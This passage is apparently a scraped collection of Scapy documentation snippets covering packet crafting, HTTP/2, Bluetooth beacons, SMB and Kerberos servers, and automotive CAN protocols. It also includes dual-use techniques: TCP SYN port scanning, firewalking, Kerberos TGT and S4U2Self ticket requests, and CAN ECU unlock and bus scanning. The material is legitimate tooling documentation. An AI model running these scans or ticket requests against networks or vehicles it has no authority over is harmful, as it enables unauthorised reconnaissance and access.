\\x14\\xb6\\xe0\\x00\\x00\\x00\\x00\\x011j\\x82\\x01-0\\x82\\x01)\\xa1\\x03\\x02\\x01\\x05\\xa2\\x03\\x02\\x01\\n\\xa3c0a0L\\xa1\\x03\\x02\\x01\\x02\\xa2E\\x04C0A\\xa0\\x03\\x02\\x01\\x12\\xa2:\\x048HHM\\xec\\xb0\\x1c\\x9bb\\xa1\\xca\\xbf\\xbc?-\\x1e\\xd8Z\\xa5\\xe0\\x93\\xba\\x83X\\xa8\\xce\\xa3MC\\x93\\xaf\\x93\\xbf!\\x1e'O\\xa5\\x8e\\x81Hx\\xdb\\x9f\\rz(\\xd9Ns'f\\r\\xb4\\xf3pK0\\x11\\xa1\\x04\\x02\\x02\\x00\\x80\\xa2\\t\\x04\\x070\\x05\\xa0\\x03\\x01\\x01\\xff\\xa4\\x81\\xb70\\x81\\xb4\\xa0\\x07\\x03\\x05\\x00@\\x81\\x00\\x10\\xa1\\x120\\x10\\xa0\\x03\\x02\\x01\\x01\\xa1\\t0\\x07\\x1b\\x05win1$\\xa2\\x0e\\x1b\\x0cDOMAIN.LOCAL\\xa3!0\\x1f\\xa0\\x03\\x02\\x01\\x02\\xa1\\x180\\x16\\x1b\\x06krbtgt\\x1b\\x0cDOMAIN.LOCAL\\xa5\\x11\\x18\\x0f20370913024805Z\\xa6\\x11\\x18\\x0f20370913024805Z\\xa7\\x06\\x02\\x04p\\x1c\\xc5\\xd1\\xa8\\x150\\x13\\x02\\x01\\x12\\x02\\x01\\x11\\x02\\x01\\x17\\x02\\x01\\x18\\x02\\x02\\xffy\\x02\\x01\\x03\\xa9\\x1d0\\x1b0\\x19\\xa0\\x03\\x02\\x01\\x14\\xa1\\x12\\x04\\x10WIN1            \")\n>>> pkt[TCP].payload.show()\n```\n\n----------------------------------------\n\nTITLE: HTTP Request with NTLM Authentication\nDESCRIPTION: Demonstrates making an HTTP request to a server that requires NTLM authentication. The example shows how to configure HTTP_Client with NTLM authentication credentials.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/http.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.layers.http import *  # or load_layer(\"http\")\nclient = HTTP_Client(\n    HTTP_AUTH_MECHS.NTLM,\n    ssp=NTLMSSP(UPN=\"user\", PASSWORD=\"password\"),\n)\nresp = client.request(\"http://127.0.0.1:8080\")\nclient.close()\n```\n\n----------------------------------------\n\nTITLE: TCP Port Scanning\nDESCRIPTION: Performs TCP SYN scanning to detect open ports.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_46\n\nLANGUAGE: python\nCODE:\n```\nres, unans = sr( IP(dst=\"target\")/TCP(flags=\"S\", dport=(1,1024)) )\nres.nsummary( lfilter=lambda s,r: (r.haslayer(TCP) and (r.getlayer(TCP).flags & 2)) )\n```\n\n----------------------------------------\n\nTITLE: Loading and Using Keytab for Client Authentication in Scapy\nDESCRIPTION: This code demonstrates how to load a keytab file for client authentication in Scapy's Ticketer module. It opens a keytab file, displays its contents, and then uses it to request a TGT without requiring password input.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\n>>> load_module(\"ticketer\")\n>>> t = Ticketer()\n>>> t.open_keytab(\"test.keytab\")\n>>> t.show()\nKeytab name: test.keytab\nPrincipal                   Timestamp          KVNO  Keytype\nAdministrator@domain.local  14/04/25 21:47:59  0     AES128-CTS-HMAC-SHA1-96\nAdministrator@domain.local  14/04/25 21:47:59  0     AES256-CTS-HMAC-SHA1-96\nAdministrator@domain.local  14/04/25 21:47:59  0     RC4-HMAC\n\nNo tickets in CCache.\n>>> t.request_tgt(\"Administrator@domain.local\")\n```\n\n----------------------------------------\n\nTITLE: Creating an ECU Automaton in Python with Scapy\nDESCRIPTION: Implementation of an ECU automaton using Scapy's Automaton framework. Defines states for power on/off and handlers for state transitions based on power supply events.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_42\n\nLANGUAGE: python\nCODE:\n```\nfrom typing import Optional, List, IO, Type, Any\nfrom scapy.automaton import Automaton, ATMT\n\nclass EcuAutomaton(Automaton):\n    def __init__(self, *args: Any, power_supply: AutomatonPowerSupply, **kargs: Any) -> None:\n        self.power_supply = power_supply\n        super().__init__(*args,\n                         external_fd={\"power_supply_fd\": self.power_supply.read_pipe.fileno()},\n                         **kargs)\n\n    @ATMT.state(initial=1)  # type: ignore\n    def ECU_OFF(self) -> None:\n        pass\n\n    @ATMT.state()  # type: ignore\n    def ECU_ON(self) -> None:\n        pass\n\n    # ====== POWER HANDLING ==========\n    @ATMT.ioevent(ECU_OFF, name=\"power_supply_fd\")  # type: ignore\n    def event_voltage_changed_on(self, fd: IO[bytes]) -> None:\n        new_voltage = fd.read(1)\n        if new_voltage == b\"1\":\n            raise self.ECU_ON()\n\n    @ATMT.ioevent(ECU_ON, name=\"power_supply_fd\")  # type: ignore\n    def event_voltage_changed_off(self, fd: IO[bytes]) -> None:\n        new_voltage = fd.read(1)\n        if new_voltage == b\"0\":\n            raise self.ECU_OFF()\n\n    @ATMT.action(event_voltage_changed_on)  # type: ignore\n    def action_consumption_on(self) -> None:\n        self.debug(1, \"Consuming energy ON\")\n        with self.power_supply.current_on.get_lock():\n            self.power_supply.current_on.value = 1\n\n    @ATMT.action(event_voltage_changed_off)  # type: ignore\n    def action_consumption_off(self) -> None:\n        self.debug(1, \"Consuming energy OFF\")\n        with self.power_supply.current_on.get_lock():\n            self.power_supply.current_on.value = 0\n```\n\n----------------------------------------\n\nTITLE: Reconstructing HTTP Chunks with TCPSession\nDESCRIPTION: Shows how to use sniff() with TCPSession to reconstruct HTTP data chunks from a pcap file. This example demonstrates how to extract and save a JPEG image that was transmitted in chunks over HTTP.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/http.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\nload_layer(\"http\")\npkts = sniff(offline=\"http_chunk.pcap.gz\", session=TCPSession)\n# a[29] is the HTTPResponse\nwith open(\"image.jpg\", \"wb\") as file:\n    file.write(pkts[29].load)\n```\n\n----------------------------------------\n\nTITLE: Enabling BLE Device Discovery\nDESCRIPTION: Sets up active scanning mode for Bluetooth Low Energy device discovery. Configures scan parameters and enables scanning with duplicate filtering disabled.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/bluetooth.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n>>> # type=1: Active scanning mode\n>>> bt.sr(\n...   HCI_Hdr()/\n...   HCI_Command_Hdr()/\n...   HCI_Cmd_LE_Set_Scan_Parameters(type=1))\n\n>>> # filter_dups=False: Show duplicate advertising reports\n>>> bt.sr(\n...   HCI_Hdr()/\n...   HCI_Command_Hdr()/\n...   HCI_Cmd_LE_Set_Scan_Enable(\n...     enable=True,\n...     filter_dups=False))\n```\n\n----------------------------------------\n\nTITLE: Inspecting HTTP/2 Header Compression Table in Python\nDESCRIPTION: Examines the dynamic header compression table after building HTTP/2 request headers. Shows which headers were indexed for more efficient compression in subsequent requests.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\nfor i in xrange(max(tblhdr._static_entries.keys()) + 1, max(tblhdr._static_entries.keys()) + 1 + len(tblhdr._dynamic_table)):\n    print('Header: {} Value: {}'.format(tblhdr[i].name(), tblhdr[i].value()))\n```\n\n----------------------------------------\n\nTITLE: Detecting Rogue DHCP Servers with Scapy in Python\nDESCRIPTION: This code sends a DHCP discover request and analyzes the replies to identify active DHCP servers on a network. It disables IP address checking, constructs a DHCP discover packet, and sends it using srp(). The responses are then parsed to extract the MAC and IP addresses of the DHCP servers.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_50\n\nLANGUAGE: python\nCODE:\n```\nconf.checkIPaddr = False\nfam,hw = get_if_raw_hwaddr(conf.iface)\ndhcp_discover = Ether(dst=\"ff:ff:ff:ff:ff:ff\")/IP(src=\"0.0.0.0\",dst=\"255.255.255.255\")/UDP(sport=68,dport=67)/BOOTP(chaddr=hw)/DHCP(options=[(\"message-type\",\"discover\"),\"end\"])\nans, unans = srp(dhcp_discover, multi=True)      # Press CTRL-C after several seconds\n```\n\nLANGUAGE: python\nCODE:\n```\nans.summary()\n```\n\nLANGUAGE: python\nCODE:\n```\nfor p in ans: print p[1][Ether].src, p[1][IP].src\n```\n\n----------------------------------------\n\nTITLE: Starting SMB Server with Kerberos Authentication in Python using Scapy\nDESCRIPTION: Configures an SMB server with Kerberos authentication using AES256 encryption. Shares a directory named 'Scapy' from the /tmp path over eth0 interface.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/smb.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nsmbserver(\n    shares=[SMBShare(name=\"Scapy\", path=\"/tmp\")],\n    iface=\"eth0\",\n    ssp=KerberosSSP(\n        KEY=Key(\n            EncryptionType.AES256_CTS_HMAC_SHA1_96,\n            key=bytes.fromhex(\"0000000000000000000000000000000000000000000000000000000000000000\"),\n        ),\n        SPN=\"cifs/server.domain.local\",\n    ),\n)\n```\n\n----------------------------------------\n\nTITLE: Creating an iBeacon Advertisement with Scapy\nDESCRIPTION: This example demonstrates how to set up a virtual iBeacon using Scapy's contrib module. It creates an iBeacon data packet with a specific UUID, major, and minor values, then builds the advertising data to be sent to the BLE controller.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/bluetooth.rst#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\n# Load the contrib module for iBeacon\nload_contrib('ibeacon')\n\n# Beacon data consists of a UUID, and two 16-bit integers: \"major\" and\n# \"minor\".\n#\n# iBeacon sits on top of Apple's BLE protocol.\np = Apple_BLE_Submessage()/IBeacon_Data(\n   uuid='fb0b57a2-8228-44cd-913a-94a122ba1206',\n   major=1, minor=2)\n\n# build_set_advertising_data() wraps an Apple_BLE_Submessage or\n# Apple_BLE_Frame into a HCI_Cmd_LE_Set_Advertising_Data payload, that can\n# be sent to the BLE controller.\nbt.sr(p.build_set_advertising_data())\n```\n\n----------------------------------------\n\nTITLE: HTTP Server with NTLM Authentication\nDESCRIPTION: Demonstrates how to create an HTTP server that requires NTLM authentication. This example shows how to configure the server with NTLM credentials for user authentication.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/http.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\nserver = HTTP_Server.spawn(\n    port=8080,\n    iface=\"eth0\",\n    mech=HTTP_AUTH_MECHS.NTLM,\n    ssp=NTLMSSP(IDENTITIES={\"user\": MD4le(\"password\")}),\n)\n```\n\n----------------------------------------\n\nTITLE: Combined NTLM and Kerberos SMB Server with SPNEGO\nDESCRIPTION: Sets up an SMB server that supports both NTLM and Kerberos authentication through SPNEGO negotiation. Includes user credentials for NTLM and Kerberos configuration.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/smb.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\nsmbserver(\n    shares=[SMBShare(name=\"Scapy\", path=\"/tmp\")],\n    iface=\"eth0\",\n    ssp=SPNEGOSSP(\n        [\n            KerberosSSP(\n                KEY=Key(\n                    EncryptionType.AES256_CTS_HMAC_SHA1_96,\n                    key=bytes.fromhex(\"0000000000000000000000000000000000000000000000000000000000000000\"),\n                ),\n                SPN=\"cifs/server.domain.local\",\n            ),\n            NTLMSSP(\n                IDENTITIES={\n                    \"User1\": MD4le(\"Password1\"),\n                    \"Administrator\": MD4le(\"Password2\"),\n                },\n            ),\n        ]\n    ),\n)\n```\n\n----------------------------------------\n\nTITLE: Using p0f with Scapy Packet Sniffing\nDESCRIPTION: Example of using Scapy's sniff function with p0f to capture network packets and identify operating systems of the sources in real-time.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_57\n\nLANGUAGE: python\nCODE:\n```\n>>> sniff(prn=prnp0f)\n192.168.1.100:54716 - Linux 2.6 (newer, 1) (up: 24 hrs)\n  -> 74.125.19.104:www (distance 0)\n<Sniffed: TCP:339 UDP:2 ICMP:0 Other:156>\n```\n\n----------------------------------------\n\nTITLE: Generating Netflow V1 Packet in Python using Scapy\nDESCRIPTION: This snippet demonstrates how to create a Netflow V1 packet using Scapy. It constructs a Netflow header, a Netflow V1 header, and a Netflow V1 record, then encapsulates it in Ethernet, IP, and UDP layers.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/netflow.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nnetflow = NetflowHeader()/NetflowHeaderV1()/NetflowRecordV1()\npkt = Ether()/IP()/UDP()/netflow\n```\n\n----------------------------------------\n\nTITLE: Displaying IPv4 Routes in Scapy\nDESCRIPTION: Shows how to display the IPv4 routing table and perform route lookups using Scapy's conf.route object.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/routing.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\n>>> conf.route\n\nNetwork          Netmask          Gateway   Iface  Output IP  Metric\n0.0.0.0          0.0.0.0          10.0.0.1  eth0   10.0.0.5   100\n10.0.0.0         255.255.255.0    0.0.0.0   eth0   10.0.0.5   0\n127.0.0.0        255.0.0.0        0.0.0.0   lo     127.0.0.1  1\n168.63.129.16    255.255.255.255  10.0.0.1  eth0   10.0.0.5   100\n169.254.169.254  255.255.255.255  10.0.0.1  eth0   10.0.0.5   100\n```\n\nLANGUAGE: python\nCODE:\n```\n>>> conf.route.route(\"127.0.0.1\")\n('lo', '127.0.0.1', '0.0.0.0')\n```\n\n----------------------------------------\n\nTITLE: Custom SMB Server Implementation\nDESCRIPTION: Shows how to create a custom SMB server by extending the base SMB_Server class and overriding specific handlers. This example customizes the Echo Request handler.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/smb.rst#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.layers.smbserver import SMB_Server\nclass MyCustomSMBServer(SMB_Server):\n    \"\"\"\n    Ridiculous demo SMB Server\n\n    We overwrite the handler of \"SMB Echo Request\" to do some crazy stuff\n    \"\"\"\n    @ATMT.action(SMB_Server.receive_echo_request)\n    def send_echo_reply(self, pkt):\n        super(MyCustomSMBServer, self).send_echo_reply(pkt)  # send echo response\n        print(\"WHAT? An ECHO REQUEST? You MUUUSST be a linux user then, since Windows NEEEVER sends those !\")\n```\n\n----------------------------------------\n\nTITLE: Parsing HTTP/2 Headers with Scapy Helper Functions\nDESCRIPTION: This snippet demonstrates an alternative method to create HTTP/2 headers using Scapy's helper functions. It parses a text representation of headers and applies compression and indexing rules.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_45\n\nLANGUAGE: python\nCODE:\n```\ntblhdr.parse_txt_hdrs(\n    ''':method GET\n:scheme https\n:path /search?q=scapy\n:authority www.google.fr\naccept-encoding: gzip, deflate\ncookie: {}\naccept-language: fr-FR\naccept: text/html\nuser-agent: Scapy HTTP/2 Module\ndnt: 1\n'''.format(cookie),\n    stream_id=5,\n    max_frm_sz=srv_max_frm_sz,\n    max_hdr_lst_sz=srv_max_hdr_lst_sz,\n    is_sensitive=lambda hdr_name, hdr_val: hdr_name in ['cookie', ':path'],\n    should_index=lambda x: x in [\n            'x-requested-with', \n            'user-agent', \n            'accept-language',\n            'host',\n            'accept',\n            ':authority',\n            'dnt'\n        ]\n).show2()\n```\n\n----------------------------------------\n\nTITLE: Using Custom UDS Packet Structures in Scapy\nDESCRIPTION: This snippet demonstrates how to load and use custom UDS packet structures in the Scapy interpreter.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_31\n\nLANGUAGE: python\nCODE:\n```\n>>> load_contrib('automotive.uds')\n>>> load_contrib('automotive.OEM-XYZ.car-model-xyz')\n\n>>> pkt = UDS()/UDS_WDBI()/DBI_IP(IP='192.168.2.1', SUBNETMASK='255.255.255.0', DEFAULT_GATEWAY='192.168.2.1')\n\n>>> pkt.show()\n>>> hexdump(pkt)\n```\n\n----------------------------------------\n\nTITLE: Authenticating and Verifying SecOC Packets in Python\nDESCRIPTION: Example code demonstrating how to authenticate and verify SecOC packets using Scapy's built-in methods. Shows how to update truncated freshness values and MACs, and verify message authenticity.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_40\n\nLANGUAGE: python\nCODE:\n```\n# Suppose this is our SecOC packet\npkt: My_SecOC_CANFD\n\n# A call to secoc_authenticate will update the truncated freshness value and the truncated MAC of the packet\npkt.secoc_authenticate()\n\n# The truncated freshness value and MAC are now updated\nprint(pkt.tfv)  # Updated truncated freshness value\nprint(pkt.tmac)  # Updated truncated MAC\n\n# A call to secoc_verify will compute the MAC from the payload of the packet and the local freshness value,\n# then compare it with the truncated MAC of the packet.\nif pkt.secoc_verify():\n    print(\"Message verified\")\n```\n\n----------------------------------------\n\nTITLE: Implementing a Custom DCERPC Server in Python with Scapy\nDESCRIPTION: This snippet demonstrates how to create a custom DCERPC server by subclassing DCERPC_Server and implementing a handler for a specific request (NetrWkstaGetInfo in this case).\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/dcerpc.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.layers.dcerpc import *\nfrom scapy.layers.msrpce.all import *\n\nclass MyRPCServer(DCERPC_Server):\n    @DCERPC_Server.answer(NetrWkstaGetInfo_Request)\n    def handle_NetrWkstaGetInfo(self, req):\n        \"\"\"\n        NetrWkstaGetInfo [MS-SRVS]\n        \"returns information about the configuration of a workstation.\"\n        \"\"\"\n        return NetrWkstaGetInfo_Response(\n            WkstaInfo=NDRUnion(\n                tag=100,\n                value=LPWKSTA_INFO_100(\n                    wki100_platform_id=500,  # NT\n                    wki100_ver_major=5,\n                ),\n            ),\n            ndr64=self.ndr64,\n        )\n```\n\n----------------------------------------\n\nTITLE: Filtering TCP Packets with SA Flag in Python using Scapy\nDESCRIPTION: This snippet demonstrates how to filter TCP packets with the 'SA' flag set using Scapy's nsummary method with a lambda function as a filter.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_14\n\nLANGUAGE: python\nCODE:\n```\n>>> ans.nsummary(lfilter = lambda s,r: r.sprintf(\"%TCP.flags%\") == \"SA\")\n```\n\n----------------------------------------\n\nTITLE: Establishing HTTP/2 Connection with SSL Socket in Python\nDESCRIPTION: Connects the SSL socket to the server and verifies that HTTP/2 (h2) was selected as the ALPN protocol.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\nssl_sock.connect(ip_and_port)\nassert('h2' == ssl_sock.selected_alpn_protocol())\n```\n\n----------------------------------------\n\nTITLE: Advanced Firewalking with IP Options in Python\nDESCRIPTION: Performs advanced firewalking using IP options for network enumeration. It sends ICMP packets with different IP options and TTL values, then creates a summary table of the results.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nans = sr([IP(dst=\"8.8.8.8\", ttl=(1, 8), options=IPOption_RR())/ICMP(seq=RandShort()), IP(dst=\"8.8.8.8\", ttl=(1, 8), options=IPOption_Traceroute())/ICMP(seq=RandShort()), IP(dst=\"8.8.8.8\", ttl=(1, 8))/ICMP(seq=RandShort())], verbose=False, timeout=3)[0]\nans.make_table(lambda x, y: (\", \".join(z.summary() for z in x[IP].options) or '-', x[IP].ttl, y.sprintf(\"%IP.src% %ICMP.type%\")))\n```\n\n----------------------------------------\n\nTITLE: Creating CCP (CAN Calibration Protocol) Messages in Python\nDESCRIPTION: This snippet demonstrates how to create CCP (CAN Calibration Protocol) messages, including Command Receive Objects (CRO) for various operations like CONNECT, GET_SEED, and UNLOCK.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\nload_contrib('automotive.ccp')\nCCP(identifier=0x700)/CRO(ctr=1)/CONNECT(station_address=0x02)\nCCP(identifier=0x711)/CRO(ctr=2)/GET_SEED(resource=2)\nCCP(identifier=0x711)/CRO(ctr=3)/UNLOCK(key=b\"123456\")\n\n# Sending a CRO message\npkt = CCP(identifier=0x700)/CRO(ctr=1)/CONNECT(station_address=0x02)\nsock = CANSocket(bustype='socketcan', channel='vcan0')\nsock.send(pkt)\n```\n\n----------------------------------------\n\nTITLE: Generating Network Analysis Tables in Scapy\nDESCRIPTION: Shows how to create formatted tables from packet analysis results using make_table(). This functionality helps visualize multi-packet analysis like traceroutes or port scans.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_31\n\nLANGUAGE: Python\nCODE:\n```\n>>> ans.make_table( lambda s,r: (s.dst, s.ttl, r.src) )\n```\n\n----------------------------------------\n\nTITLE: Performing S4U2Self Authentication in Scapy\nDESCRIPTION: This snippet demonstrates how to perform Service-for-User-to-Self (S4U2Self) authentication, where a service requests a ticket on behalf of a user. It uses a machine account with its AES256 key to request tickets for a specific user.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/kerberos.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\n>>> load_module(\"ticketer\")\n>>> t = Ticketer()\n>>> t.request_tgt(\"SERVER1$@domain.local\", key=Key(EncryptionType.AES256_CTS_HMAC_SHA1_96, bytes.fromhex(\"63a2577d8bf6abeba0847cded36b9aed202c23750eb9c56b6155be1cc946bb1d\")))\n>>> t.request_st(0, \"host/SERVER1\", for_user=\"Administrator@domain.local\")\n>>> t.show()\nCCache tickets:\n0. SERVER1$@DOMAIN.LOCAL -> krbtgt/DOMAIN.LOCAL@DOMAIN.LOCAL\n   canonicalize+pre-authent+initial+renewable+forwardable\nStart time         End time           Renew until        Auth time\n15/04/25 20:15:17  16/04/25 06:10:22  16/04/25 06:10:22  15/04/25 20:15:17\n\n1. Administrator@domain.local -> host/SERVER1@DOMAIN.LOCAL\n   canonicalize+pre-authent+renewable+forwardable\nStart time         End time           Renew until        Auth time\n15/04/25 20:15:20  16/04/25 06:10:22  16/04/25 06:10:22  15/04/25 20:15:17\n```\n\n----------------------------------------\n\nTITLE: HTTP/2 Frame Sequence Structure with HPack Header Compression in Scapy\nDESCRIPTION: This snippet displays the structure of an HTTP/2 frame sequence containing a Headers Frame with HPack compression. It shows the frame length, type, flags, stream ID, and the nested HPack headers that include dynamic size update, indexed header field, and literal headers with incremental indexing for Accept-Encoding, gzip, and image/x-icon content types.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_22\n\nLANGUAGE: python\nCODE:\n```\n###[ HTTP/2 Frame Sequence ]### \n  \\frames    \\\n   |###[ HTTP/2 Frame ]### \n   |  len       = 0xe1\n   |  type      = HdrsFrm\n   |  flags     = set(['End Headers (EH)'])\n   |  reserved  = 0L\n   |  stream_id = 3L\n   |###[ HTTP/2 Headers Frame ]### \n   |     \\hdrs      \\\n   |      |###[ HPack Dynamic Size Update ]### \n   |      |  magic     = 1\n   |      |  max_size  = 12288\n   |      |###[ HPack Indexed Header Field ]### \n   |      |  magic     = 1\n   |      |  index     = 8\n   |      |###[ HPack Literal Header With Incremental Indexing ]### \n   |      |  magic     = 1\n   |      |  index     = 59\n   |      |  \\hdr_value \\\n   |      |   |###[ HPack Header String ]### \n   |      |   |  type      = Compressed\n   |      |   |  len       = 11\n   |      |   |  data      = 'HPackZString(Accept-Encoding)'\n   |      |###[ HPack Literal Header With Incremental Indexing ]### \n   |      |  magic     = 1\n   |      |  index     = 26\n   |      |  \\hdr_value \\\n   |      |   |###[ HPack Header String ]### \n   |      |   |  type      = Compressed\n   |      |   |  len       = 3\n   |      |   |  data      = 'HPackZString(gzip)'\n   |      |###[ HPack Literal Header With Incremental Indexing ]### \n   |      |  magic     = 1\n   |      |  index     = 31\n   |      |  \\hdr_value \\\n   |      |   |###[ HPack Header String ]### \n   |      |   |  type      = Compressed\n   |      |   |  len       = 9\n   |      |   |  data      = 'HPackZString(image/x-icon)'\n```\n\n----------------------------------------\n\nTITLE: Loading and Using Extcap Interfaces in Scapy\nDESCRIPTION: Demonstrates how to load and use Wireshark's extcap interfaces in Scapy, including displaying available interfaces and using sshdump.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/routing.rst#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\n>>> load_extcap()\n>>> conf.ifaces\nSource       Index  Name                                     Address\nciscodump    100    Cisco remote capture                     ciscodump\ndpauxmon     100    DisplayPort AUX channel monitor capture  dpauxmon\nrandpktdump  100    Random packet generator                  randpkt\nsdjournal    100    systemd Journal Export                   sdjournal\nsshdump      100    SSH remote capture                       sshdump\nudpdump      100    UDP Listener remote capture              udpdump\nwifidump     100    Wi-Fi remote capture                     wifidump\nSource  Index  Name  MAC                IPv4          IPv6\nsys     1      lo    00:00:00:00:00:00  127.0.0.1     ::1\nsys     2      eth0  Microsof:12:cb:ef  10.0.0.5  fe80::10a:2bef:dc12:afae\n```\n\nLANGUAGE: python\nCODE:\n```\n>>> load_extcap()\n>>> sniff(\n...     iface=\"sshdump\",\n...     prn=lambda x: x.summary(),\n...     remote_host=\"192.168.0.1\",\n...     remote_username=\"root\",\n...     remote_password=\"SCAPY\",\n... )\n```\n\n----------------------------------------\n\nTITLE: Using ISOTP Scanner in Interactive Python Shell\nDESCRIPTION: This snippet demonstrates how to use the isotp_scan function in an interactive Python shell to find ISOTP sockets on a CAN interface.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_29\n\nLANGUAGE: python\nCODE:\n```\n>>> conf.contribs['ISOTP'] = {'use-can-isotp-kernel-module': True}\n>>> conf.contribs['CANSocket'] = {'use-python-can': False}\n>>> load_contrib('cansocket')\n>>> load_contrib('isotp')\n>>> socks = isotp_scan(CANSocket(\"vcan0\"), range(0x700, 0x800), can_interface=\"vcan0\")\n>>> socks\n```\n\n----------------------------------------\n\nTITLE: Sending CRO Message with CCP over CAN in Python\nDESCRIPTION: Creates a CRO (Command Receive Object) message using CCP (CAN Calibration Protocol) and sends it over a CAN socket. Shows how to set up the socket and interpret the response.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_13\n\nLANGUAGE: Python\nCODE:\n```\ncro = CCP(identifier=0x700)/CRO(ctr=0x53)/PROGRAM_6(data=b\"\\x10\\x11\\x12\\x10\\x11\\x12\")\nsock = CANSocket(bustype='socketcan', channel='vcan0', basecls=CCP)\ndto = sock.sr1(cro)\ndto.show()\n```\n\n----------------------------------------\n\nTITLE: Setting up AltBeacon Advertising with Scapy\nDESCRIPTION: This example demonstrates how to set up a virtual AltBeacon using Scapy's contrib module. It creates an AltBeacon instance with specific IDs and transmit power, then builds the advertising data packet.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/bluetooth.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\n# Load the contrib module for AltBeacon\nload_contrib('altbeacon')\n\nab = AltBeacon(\n    id1='2f234454-cf6d-4a0f-adf2-f4911ba9ffa6',\n    id2=1,\n    id3=2,\n    tx_power=-59,\n)\n\nbt.sr(ab.build_set_advertising_data())\n```\n\n----------------------------------------\n\nTITLE: Configuring Scapy to Use Libpcap Sockets in Python\nDESCRIPTION: This snippet demonstrates how to configure Scapy to use libpcap sockets for packet capture and transmission, which is useful for cross-platform compatibility.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_18\n\nLANGUAGE: python\nCODE:\n```\n>>> conf.use_pcap = True\n>>> conf.L3socket=L3pcapSocket  # Receive/send L3 packets through libpcap\n>>> conf.L2listen=L2ListenTcpdump  # Receive L2 packets through TCPDump\n```\n\n----------------------------------------\n\nTITLE: Registering SecOC Protected PDUs in Python\nDESCRIPTION: Code snippet showing how to register SecOC PDUs and initialize a CANSocket with a custom SecOC packet class. This informs the dissector which PDUs should be treated as SecOC-protected.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_39\n\nLANGUAGE: python\nCODE:\n```\nMy_SecOC_CANFD.register_secoc_protected_pdu(pdu_id=0x123)\n\nsocket = CANSocket(\"vcan0\", fd=True, basecls=My_SecOC_CANFD)\n```\n\n----------------------------------------\n\nTITLE: Installing Scapy from Source\nDESCRIPTION: Basic commands for installing Scapy from source code using git. Shows the process of cloning the repository and running the tool.\nSOURCE: https://github.com/secdev/scapy/blob/master/README.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/secdev/scapy\ncd scapy\n./run_scapy\n```\n\n----------------------------------------\n\nTITLE: Plotting Packet Data with Matplotlib in Scapy\nDESCRIPTION: Shows how to create visual plots of packet analysis results using Matplotlib integration. Useful for visualizing patterns in packet fields like IP ID sequences.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_33\n\nLANGUAGE: 